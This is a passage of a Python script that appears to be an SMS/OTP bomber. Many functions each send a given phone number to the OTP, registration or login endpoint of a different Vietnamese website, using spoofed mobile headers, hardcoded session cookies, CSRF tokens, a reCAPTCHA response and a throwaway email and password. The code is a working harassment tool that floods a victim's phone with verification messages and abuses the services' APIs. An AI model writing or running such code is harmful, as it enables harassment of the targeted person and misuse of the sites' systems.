    # 'cookie': 'supportOnlineTalkID=Tgae5HbMTkxEJl3bJFHW90Marnk0g0x6; __cfruid=f1a6f7bd1587ecec8ebc3b75f57137c8af12676c-1682928280; XSRF-TOKEN=eyJpdiI6Ik9XT3lTck9TTFZQU3hrUzlxaXhWUUE9PSIsInZhbHVlIjoicmZlNEJ5SmJzKzJGSytKK2xDeFF4RlZtWXlnQ2ZWbXl6a3l6WWtwT3M2dFB1OHpLeWdLczBrTTlNT0ZVNXRlL0xmcUh2SWpHclZJSGRMenhqc3J4N2JnTllYZlowOGViQ3B4U1Iwb1VYQ2dPcDRKd3ZyWVRUQ2hEbitvT0lYb2IiLCJtYWMiOiIxMjg4MWM4MmMyYTM3N2ZkNDVkNmI0YTFiNTNmOTc4N2QxMjExNjc1MDZmYWNlNDlhMmE2MzVhZWVkYzBiZjViIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6InUyUXBmZGx5dEExYjVmaGt3UlQ3Mnc9PSIsInZhbHVlIjoiSGhzckx3U1lqYVRFY2hHdXZBalJ0ZzV5cHhqSUpsOGJVZzlJajVOTituZDRXR3o2cGNJRnFFWUpOYzAvdmlNd3BGS1JjTm1maE5QVS9DU0VqdkZMRGZ1N3dVOCszMGxuekw4S3BxSCtXY1ZCWFlqZjAzWlBDMHJqcm5yOHh3MHIiLCJtYWMiOiI3ZmQ2ZGZiM2FmNjJjODc4OWM0YTUwMmZlZjA3MmNjZWFiODAzNGQ5MDE5ZmJjM2MxOGVhZjY1ZjVjMDlmZWUwIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IlFWMWI0dUtNaGM4MUZVUHg0TWg1YXc9PSIsInZhbHVlIjoiNVcyVjh0UmZuUG4xUjRUTTR6enFHbVFMdmkyb0tTOWozMFBsdkNiT0hPcEt5TlloWk51aVJ2OVFNdHoyWGZ5SHZwcVBsYnhSZXpPUytiek0vZjNrNG5rUkVqTkpyeWZmTjRBT09aaGV3QWF2SzBMUEFxZ0xTeURnZy9rdThOcFciLCJtYWMiOiJlOWZhNzNkNTNhZGJiODgxMjIxN2ZjMTY4ZDk2NjRhNDc5MTVjMjNjYjQ3ZmZmZTk5NzcxNDJiODI4NzI2YWNmIiwidGFnIjoiIn0%3D; ec_cache_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_cache_client=false; ec_cache_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; ec_png_client=false; ec_png_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_etag_client=false; ec_png_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; ec_etag_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_etag_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; uid=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; client=false; client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'origin': 'https://robocash.vn',
    'referer': 'https://robocash.vn/register',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent':
    'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
  }

  data = {
    'phone': phone,
    '_token': 'iSkFRbkX3IamHEhtVZAi9AZ3PLRlaXMjX1hJJS3I',
  }

  requests.post('https://robocash.vn/register/phone-resend',
                cookies=cookies,
                headers=headers,
                data=data)


def call2(phone):
  headers = {
    'authority':
    'api.dongplus.vn',
    'accept':
    '*/*',
    'accept-language':
    'vi',
    'content-type':
    'application/json',
    'origin':
    'https://dongplus.vn',
    'referer':
    'https://dongplus.vn/user/login',
    'sec-ch-ua':
    '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile':
    '?1',
    'sec-ch-ua-platform':
    '"Android"',
    'sec-fetch-dest':
    'empty',
    'sec-fetch-mode':
    'cors',
    'sec-fetch-site':
    'same-site',
    'user-agent':
    'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
  }

  json_data = {
    'phone': phone,
  }
  requests.post('https://api.dongplus.vn/api/user/send-one-time-password',
                headers=headers,
                json=json_data)


def call3(phone):
  cookies = {
    'OnCredit_id': '643d8607c6ffe8.92935100',
    'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef':
    'o18F9FMkyjwzc8WWI7lEDpIVIrahUYQaI/C6s8jYjLI=',
    'SN5c8116d5e6183': 'rfsd6jmf1e0daeapvmv1p0i6bu',
  }

  headers = {
    'authority': 'oncredit.vn',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language':
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'OnCredit_id=643d8607c6ffe8.92935100; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=o18F9FMkyjwzc8WWI7lEDpIVIrahUYQaI/C6s8jYjLI=; SN5c8116d5e6183=rfsd6jmf1e0daeapvmv1p0i6bu',
    'origin': 'https://oncredit.vn',
    'referer': 'https://oncredit.vn/registration',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent':
    'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
  }

  data = {
    'data[typeData]':
    'sendCodeReg',
    'data[phone]':
    phone,
    'data[email]':
    'tv5v4v4v4c@gmail.com',
    'data[captcha1]':
    '1',
    'data[lang]':
    'vi',
    'CSRFName':
    'CSRFGuard_ajax',
    'CSRFToken':
    't8ETz5Y5HFnBefT9dEnDBDe9S4D5RdyEFNKSFDn8b5YSFAB7yr5rD5QZ6b974ARi',
  }

  requests.post('https://oncredit.vn/?ajax',
                cookies=cookies,
                headers=headers,
                data=data)


def k1(phone):
  Headers = {
    "Host":
    "vietteltelecom.vn",
    "Connection":
    "keep-alive",
    "Content-Length":
    "23",
    "X-XSRF-TOKEN":
    "eyJpdiI6ImhrazdqSjBnbG1TYW55VnVWemFOM0E9PSIsInZhbHVlIjoiUGxTbDd4T3VscHZLT3M3UmZZU1hlTHVhZVBXQXBTZUIwcFZJQTMzVFNxeG1LV3B4T2VMQlA3TXh6TURTNUU0bSIsIm1hYyI6IjgwMDkzNzQ0YjI3YWQ3Y2NhNTc1MzY4ZWI2OGRjODc2YjEyYTk0YjNlNWY3M2UzNWFlMzE5MTgxMzFlYzViMmEifQ\u003d\u003d",
    "X-CSRF-TOKEN":
    "8E0KIZ1tDsEXlXug0Iv4LYcG8Tv6ltWyelVMdaIt",
    "sec-ch-ua-mobile":
    "?1",
    "User-Agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Content-Type":
    "application/json;charset\u003dUTF-8",
    "Accept":
    "application/json, text/plain, */*",
    "X-Requested-With":
    "XMLHttpRequest",
    "sec-ch-ua-platform":
    "\"Android\"",
    "Origin":
    "https://vietteltelecom.vn",
    "Sec-Fetch-Site":
    "same-origin",
    "Sec-Fetch-Mode":
    "cors",
    "Sec-Fetch-Dest":
    "empty",
    "Referer":
    "https://vietteltelecom.vn/dang-ky",
    "Accept-Encoding":
    "gzip, deflate, br",
    "Accept-Language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4",
    "Cookie":
    "laravel_session\u003dm1OZX9LMvVIDUCfNQw9eigTjTFr954CS5BJW0WsF; cookie_authen\u003deyJpdiI6InBrdmdXYVwvR2JUN0dPcEV0VU1xd1FRPT0iLCJ2YWx1ZSI6Ilo3QzNtUWpYM1ZKMTd5MmlUVzZOK2c9PSIsIm1hYyI6ImU5ZTUyZmQzNGQwMTFiZjExMTJlYWI5NDhjYjk5MmM5MjhkYjEzZWMwOTA4MWQwNmZmNmUzZDc5ZWY4YWM5NTMifQ%3D%3D; _gcl_au\u003d1.1.1616840172.1682939677; _gid\u003dGA1.2.1583735508.1682939681; _gat_UA-58224545-1\u003d1; _fbp\u003dfb.1.1682939682509.1997395715; __zi\u003d3000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NSqtr_JpqH9BsdU8ilNJN07QVecozfPV0TmxYhFpcri7tJWm.1; _ga\u003dGA1.1.2133923006.1682939681; redirectLogin\u003dhttps://vietteltelecom.vn/dang-ky; _ga_VH8261689Q\u003dGS1.1.1682939681.1.1.1682939695.0.0.0; XSRF-TOKEN\u003deyJpdiI6ImhrazdqSjBnbG1TYW55VnVWemFOM0E9PSIsInZhbHVlIjoiUGxTbDd4T3VscHZLT3M3UmZZU1hlTHVhZVBXQXBTZUIwcFZJQTMzVFNxeG1LV3B4T2VMQlA3TXh6TURTNUU0bSIsIm1hYyI6IjgwMDkzNzQ0YjI3YWQ3Y2NhNTc1MzY4ZWI2OGRjODc2YjEyYTk0YjNlNWY3M2UzNWFlMzE5MTgxMzFlYzViMmEifQ%3D%3D"
  }
  Datason = json.dumps({"msisdn": phone})
  response = requests.post("https://vietteltelecom.vn/api/get-otp",
                           headers=Headers,
                           data=Datason)


def k2(phone):
  Headers = {
    "Host":
    "funring.vn",
    "Connection":
    "keep-alive",
    "Content-Length":
    "28",
    "Accept":
    "*/*",
    "User-Agent":
    "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
    "Content-Type":
    "application/json",
    "Origin":
    "http://funring.vn",
    "Referer":
    "http://funring.vn/module/register_mobile.jsp",
    "Accept-Encoding":
    "gzip, deflate",
    "Accept-Language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4",
    "Cookie":
    "JSESSIONID\u003dNODE011a2c48nzutiw8p6cy3nabxbx974764.NODE01; _ga\u003dGA1.2.1626827841.1679236846; _gid\u003dGA1.2.888694467.1679236846; _gat\u003d1"
  }
  Datason = json.dumps({"username": phone[1:11]})
  response = requests.post("http://funring.vn/api/v1.0.1/jersey/user/getotp",
                           data=Datason,
                           headers=Headers)


def k3(phone):
  csrfget = requests.post(
    "https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F"
  ).text
  csrf = csrfget.split('name="csrf-token" value="')[1].split('"/>')[0]
  Headers = {
    "Host": "oauth.vietid.net",
    "content-length": "41",
    "cache-control": "max-age\u003d0",
    "sec-ch-ua":
    "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"",
    "upgrade-insecure-requests": "1",
    "origin": "https://oauth.vietid.net",
    "content-type": "application/x-www-form-urlencoded",
    "user-agent":
    "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
    "accept":
    "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.7",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer":
    "https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F",
    "accept-encoding": "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4",
    "cookie": "_ga_H5VRTZBFLG\u003dGS1.1.1679234987.1.0.1679234987.0.0.0"
  }
  Payload = {"csrf-token": csrf, "account": phone}
  response = requests.post(
    "https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F",
    data=Payload,
    headers=Headers)


def k4(phone):
  mail = random_string(6)
  Headers = {
    "Host":
    "api.ahamove.com",
    "content-length":
    "114",
    "sec-ch-ua":
    "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"",
    "accept":
    "application/json, text/plain, */*",
    "content-type":
    "application/json;charset\u003dUTF-8",
    "sec-ch-ua-mobile":
    "?1",
    "user-agent":
    "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
    "sec-ch-ua-platform":
    "\"Android\"",
    "origin":
    "https://app.ahamove.com",
    "sec-fetch-site":
    "same-site",
    "sec-fetch-mode":
    "cors",
    "sec-fetch-dest":
    "empty",
    "referer":
    "https://app.ahamove.com/",
    "accept-encoding":
    "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"
  }
  Datason = json.dumps({
    "mobile": f"{phone[1:11]}",
    "name": "Tuấn",
    "email": f"{mail}@gmail.com",
    "country_code": "VN",
    "firebase_sms_auth": "true"
  })
  Response = requests.post(
    "https://api.ahamove.com/api/v3/public/user/register",
    data=Datason,
    headers=Headers)


def k5(phone):
  Headers = {
    "Host":
    "api.gotadi.com",
    "content-length":
    "44",
    "sec-ch-ua":
    "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"",
    "accept":
    "application/json",
    "sec-ch-ua-platform":
    "\"Android\"",
    "gtd-client-tracking-device-id":
    "85519cab-85d7-4881-abfa-65d2a2bb3a52",
    "sec-ch-ua-mobile":
    "?1",
    "user-agent":
    "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
    "content-type":
    "application/json",
    "origin":
    "https://www.gotadi.com",
    "sec-fetch-site":
    "same-site",
    "sec-fetch-mode":
    "cors",
    "sec-fetch-dest":
    "empty",
    "referer":
    "https://www.gotadi.com/",
    "accept-encoding":
    "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"
  }
  Datason = json.dumps({"phoneNumber": phone, "language": "VI"})
  response = requests.post(
    "https://api.gotadi.com/b2c-web/api/register/phone-number/resend-otp",
    data=Datason,
    headers=Headers)


def k6(phone):
  Headers = {
    "Host":
    "nhadat.cafeland.vn",
    "content-length":
    "65",
    "accept":
    "application/json, text/javascript, */*; q\u003d0.01",
    "content-type":
    "application/x-www-form-urlencoded; charset\u003dUTF-8",
    "x-requested-with":
    "XMLHttpRequest",
    "sec-ch-ua-mobile":
    "?1",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform":
    "\"Android\"",
    "origin":
    "https://nhadat.cafeland.vn",
    "sec-fetch-site":
    "same-origin",
    "sec-fetch-mode":
    "cors",
    "sec-fetch-dest":
    "empty",
    "referer":
    "https://nhadat.cafeland.vn/dang-ky.html",
    "accept-encoding":
    "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4",
    "cookie":
    "laravel_session\u003deyJpdiI6IkhyUE8yblwvVFA1Um9KZnQ3K0syalZ3PT0iLCJ2YWx1ZSI6IlZkaG1mb3JpTUtsdjVOT3dSa0RNUFhWeDBsT21QWlcra2J5bFNzT1Q5RHdQYm83UVR4em1hNUNUN0ZFYTlIeUwiLCJtYWMiOiJiYzg4ZmU2ZWY3ZTFiMmM4MzE3NWVhYjFiZGUxMDYzNjRjZWE2MjkwYjcwOTdkMDdhMGU0OWI0MzJkNmFiOTg2In0%3D"
  }
  Payload = {
    "mobile": phone,
    "_token": "UtTOthHgd7GBgCa45KB1MiFLSqXkioMUy0GB4vAQ",
  }
  response = requests.post("https://nhadat.cafeland.vn/member-send-otp/",
                           data=Payload,
                           headers=Headers)


def k7(phone):
  Headers = {
    "Host":
    "api.f88.vn",
    "content-length":
    "617",
    "sec-ch-ua":
    "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"",
    "accept":
    "application/json, text/plain, */*",
    "content-type":
    "application/json",
    "content-encoding":
    "gzip",
    "sec-ch-ua-mobile":
    "?1",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform":
    "\"Android\"",
    "origin":
    "https://online.f88.vn",
    "sec-fetch-site":
    "same-site",
    "sec-fetch-mode":
    "cors",
    "sec-fetch-dest":
    "empty",
    "referer":
    "https://online.f88.vn/",
    "accept-encoding":
    "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"
  }
  Datason = json.dumps({
    "phoneNumber": phone,
    "recaptchaResponse":
    "03AL8dmw9M_d86Lhtnr6jivbVu0_GP4f_zBc6sQ8bq7yeLXwKLFBcANgRGeS9Vs0MAwBZqF4UJyUNXQ3qT305vzoLHjhCj6C9pbzHBz4xharypH44-2EyWQyU9yNAjfl3fyi1BUDqysNBxlhiSnYLQ6cx_T-3LcTdhcT9B7Hezlcro0eMJ2lzb08WlkCasKMpZ6kFWeNMRcAf-MntxVwXCocxDZudKC4HKz5M-mdRoIUPC1YO5gn9-WiGVcjIHvr0PC5vHn6KOCAaxaQjdLLNdyZ4Grms_7kpJyPP9DLRKae_yw4snxgQWPymN7h-bG5VlMS-zX99TJgb_sHQ8l8_ENDWA7LHhyCBNknOL-pr3mTyXPLOk-6rEaR4YYY5gDlNPrNOzGNU6lfxLUckj84Cb-RTAH3AeyNpdecwDCV2Lv30NbqGpDKrpfmbytOXdKR4VWl6DYlYd7xUAP0QB-anbPv9rrNE8C7n97ioS9OzcURNJ_dlfF8a5h5bu29EuCMHmaJ_6iebou_zYfyl0vtzrK8lthBrxEq7mww",
    "source": "Online"
  })
  response = requests.post(
    "https://api.f88.vn/growth/appvay/api/onlinelending/VerifyOTP/sendOTP",
    headers=Headers,
    data=Datason)


def k8(phone):
  Headers = {
    "Host": "mcredit.com.vn",
    "content-length": "12",
    "accept": "*/*",
    "content-type": "application/json; charset\u003dUTF-8",
    "x-requested-with": "XMLHttpRequest",
    "sec-ch-ua-mobile": "?1",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform": "\"Android\"",
    "origin": "https://mcredit.com.vn",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://mcredit.com.vn/",
    "accept-encoding": "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4",
    "cookie": "AF_SYNC\u003d1682942768167"
  }
  Data = f'"{phone}"'
  response = requests.post("https://mcredit.com.vn/api/Customers/requestOTP",
                           headers=Headers,
                           data=Data)


def k9(phone):
  Headers = {
    "Host":
    "ubofood.com",
    "Connection":
    "keep-alive",
    "Content-Length":
    "54",
    "Accept":
    "application/json, text/plain, */*",
    "Content-Type":
    "application/x-www-form-urlencoded; charset\u003dUTF-8",
    "sec-ch-ua-mobile":
    "?1",
    "User-Agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform":
    "\"Android\"",
    "Origin":
    "https://ubofood.com",
    "Sec-Fetch-Site":
    "same-origin",
    "Sec-Fetch-Mode":
    "cors",
    "Sec-Fetch-Dest":
    "empty",
    "Referer":
    "https://ubofood.com/register",
    "Accept-Encoding":
    "gzip, deflate, br",
    "Accept-Language":
    "vi-VN,vi;q\u003d0.9",
    "Cookie":
    "ubo_trade\u003d%7B%22code%22%3A%22379760000%22%2C%22name%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22email%22%3A%22%22%2C%22phone_number%22%3A%220828215656%22%2C%22address%22%3A%7B%22area%22%3A%7B%22code%22%3A%223%22%2C%22name%22%3A%22Mi%E1%BB%81n%20Nam%22%7D%2C%22city%22%3A%7B%22code%22%3A%2279%22%2C%22name%22%3A%22Th%C3%A0nh%20ph%E1%BB%91%20H%E1%BB%93%20Ch%C3%AD%20Minh%22%7D%2C%22district%22%3A%7B%22code%22%3A%22771%22%2C%22name%22%3A%22Qu%E1%BA%ADn%2010%22%7D%2C%22ward%22%3A%7B%22code%22%3A%2227199%22%2C%22name%22%3A%22Ph%C6%B0%E1%BB%9Dng%2005%22%7D%2C%22text%22%3A%22132%20Ng%C3%B4%20Quy%E1%BB%81n%22%2C%22building%22%3A%22%22%2C%22floor%22%3A%22%22%2C%22apartment_no%22%3A%22%22%7D%2C%22discount%22%3A0%2C%22coordinate%22%3A%7B%22lat%22%3A10.76224577192127%2C%22lng%22%3A106.66505889999999%7D%2C%22status%22%3Atrue%2C%22created_at%22%3A%222022-10-15T08%3A24%3A02.2Z%22%2C%22updated_at%22%3A%222023-02-21T06%3A51%3A50.44Z%22%2C%22updated_by%22%3A%22admin%22%2C%22default_pos_code%22%3A%22379760001%22%7D; ubo_token\u003dBearer%20eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTQ0ODAxOTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjM3OTc2MDAwMCJ9.tZKNt4tPQ-9rMtFyEhnahBHVBbiaaDnkSVU6KZFYhjc5eOxonkUhZ7wRN9CttwFlS2wcD-TnYy3J510OGzPW_G_AhFWuunUzw5tp9VZtIj7c1n_xIZ3HkhLOeUftWMJqtepKEfT-HQgE3PZuHyKzbINm44DaV8he6NnqqFdrg8oSoZXHq9HesLmDdKXV1xv3pJmPb3lg6MNISW9uA3fg0tSpsbJP6-BfgHTwEGcRaGrCnVBBjqr6HoVkEbw-_2peISNwNONC_vld7z6IN3b9BxHPjPhiOKMNxYLuQw-r4EcU69GiWyIERX1Osv-f9pNvMcWJJM011nb7xTKro0sAeLlJyCThVIkx4NH8l_0zY3P0BuvHWtz9pX_jQBMurSI-lTm15sDOEmGP3LVAbteTVZuiY4xvfqUUxeC_CLYt7NwHAa7vILUvME3O8L8xmnAjvqjkxplzMmsjQOxGsIYgZ1kW_WG8bXTRx69oADfTtV6Gowllags3GfhsE4ThWxHusuU9S6LCag-LXKUnho0bzxbju-4-lwrCuduSNXqTXET0_fNX4hsrj2BbroDG5710j66kzLq7Nh2Td08m7RWUf2ALpAF88CoR8m6qTOF0E_XO8a5Y0qFcbevbtKmBVqV0YiCfkXXW9ceD0yFO_AJGwVWea6dCCVg2dVWg7jP9-HY; _gcl_au\u003d1.1.1777292794.1682944193; _ga\u003dGA1.1.962990047.1682944194; _fbp\u003dfb.1.1682944194191.2034199897; _tt_enable_cookie\u003d1; _ttp\u003dNECdknStPnwSILo-MDYYWVVd3RG; _ga_KCGG79N4SY\u003dGS1.1.1682944193.1.1.1682944197.0.0.0; _ga_3PKTQRQF3P\u003dGS1.1.1682944193.1.1.1682944198.0.0.0"
  }
  Datason = json.dumps({"phone_number": phone, "trade_code": "379760000"})
  response = requests.post(
    "https://ubofood.com/api/v1/account/customers/register",
    headers=Headers,
    data=Datason)


def k10(phone):
  Headers = {
    "Host": "bapi.com.vn",
    "content-length": "16",
    "accept": "application/json, text/javascript, */*; q\u003d0.01",
    "content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8",
    "x-requested-with": "XMLHttpRequest",
    "sec-ch-ua-mobile": "?1",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform": "\"Android\"",
    "origin": "https://bapi.com.vn",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://bapi.com.vn/Login",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "vi-VN,vi;q\u003d0.9",
    "cookie": "_fbp\u003dfb.2.1682944413357.599868376"
  }
  Payload = {"Phone": phone}
  response = requests.post("https://bapi.com.vn/Account/CheckUserLogin",
                           headers=Headers,
                           data=Payload)


def k12(phone):
  Headers = {
    "Host":
    "api-crownx.winmart.vn",
    "content-length":
    "126",
    "accept":
    "application/json",
    "content-type":
    "application/json",
    "sec-ch-ua-mobile":
    "?1",
    "authorization":
    "Bearer undefined",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform":
    "\"Android\"",
    "origin":
    "https://order.phuclong.com.vn",
    "sec-fetch-site":
    "cross-site",
    "sec-fetch-mode":
    "cors",
    "sec-fetch-dest":
    "empty",
    "referer":
    "https://order.phuclong.com.vn/",
    "accept-encoding":
    "gzip, deflate, br",
    "accept-language":
    "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"
  }
  Datason = json.dumps({
    "phoneNumber": phone,
    "fullName": "Nguyễn Đặng Hoàng Hải",
    "email": "vexnolove03@gmail.com",
    "password": "Vrxx#1337"
  })
  response = requests.post(
    "https://api-crownx.winmart.vn/as/api/plg/v1/user/register",
    headers=Headers,
    data=Datason)


def k13(phone):
  Headers = {
    "Host": "onland.tech",
    "Connection": "keep-alive",
    "Content-Length": "136",
    "Accept": "application/json",
    "Content-Type": "application/json",
    "Accept-Language": "undefined",
    "sec-ch-ua-mobile": "?1",
    "User-Agent":
    "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform": "\"Android\"",
    "Origin": "https://onland.tech",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://onland.tech/user/register.html",
    "Accept-Encoding": "gzip, deflate, br"
  }
  Datason = json.dumps({
    "phone_number": phone,
    "password": "Vrxx#1337",
    "fullname": "Ahad Kumar",
    "email": "vexnolove03@gmail.com",
    "province": "24",
    "broker": ""
  })
  response = requests.post("https://onland.tech/api/register",
                           headers=Headers,
                           data=Datason)


def k14(phone):
  mail = random_string(6)
  Headers = {
    "Host":
    "www.mykingdom.com.vn",
    "content-length":
    "108",
    "accept":
    "*/*",
    "content-type":
